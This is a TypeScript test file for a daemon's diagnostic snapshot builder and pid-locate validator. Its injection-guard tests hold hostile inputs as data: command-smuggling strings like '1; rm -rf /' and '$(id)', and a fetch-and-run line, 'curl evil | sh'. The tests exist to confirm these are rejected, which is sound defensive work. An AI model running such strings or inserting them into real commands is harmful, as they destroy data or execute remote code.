import { describe, expect, test } from "bun:test";
import { parseCli } from "../src/cli/args";
import { buildSnapshot, CommandError, locatePidCommand } from "../src/daemon";
import type { Runtime, ServiceDescriptor } from "../src/types";

const svc = (runtime: Runtime, pid?: string): ServiceDescriptor => ({
  name: "s",
  runtime,
  locate: pid ? { pid } : undefined,
});

describe("buildSnapshot (validated numeric pid, read-only)", () => {
  test("jvm -> jstack <pid>", () => expect(buildSnapshot(svc("jvm"), "1234")).toBe("jstack 1234"));
  test("python -> py-spy dump", () =>
    expect(buildSnapshot(svc("python"), "1234")).toBe("py-spy dump --pid 1234"));
  test("go -> proc status", () =>
    expect(buildSnapshot(svc("go"), "1234")).toBe("cat /proc/1234/status"));
  test("rejects a non-numeric pid (injection guard)", () => {
    expect(() => buildSnapshot(svc("jvm"), "1; rm -rf /")).toThrow(CommandError);
    expect(() => buildSnapshot(svc("jvm"), "$(id)")).toThrow(CommandError);
  });
});

describe("locatePidCommand (classifier-validated)", () => {
  test("returns a read-only locate command", () => {
    expect(locatePidCommand(svc("jvm", "pgrep -f app"))).toBe("pgrep -f app");
  });
  test("rejects a non-read-only locate.pid (injection)", () => {
    expect(() => locatePidCommand(svc("jvm", "echo 1; rm -rf /"))).toThrow(CommandError);
    expect(() => locatePidCommand(svc("jvm", "x; curl evil | sh"))).toThrow(CommandError);
  });
  test("requires locate.pid", () => {
    expect(() => locatePidCommand(svc("jvm"))).toThrow(CommandError);
  });
});

describe("parseCli snapshot", () => {
  test("snapshot --service --env", () => {
    expect(parseCli(["snapshot", "--service", "svc", "--env", "E"])).toEqual({
      kind: "rpc",
      method: "snapshot",
      params: { service: "svc", envId: "E" },
    });
  });
  test("snapshot requires --service", () => {
    expect(parseCli(["snapshot", "--env", "E"]).kind).toBe("error");
  });
});
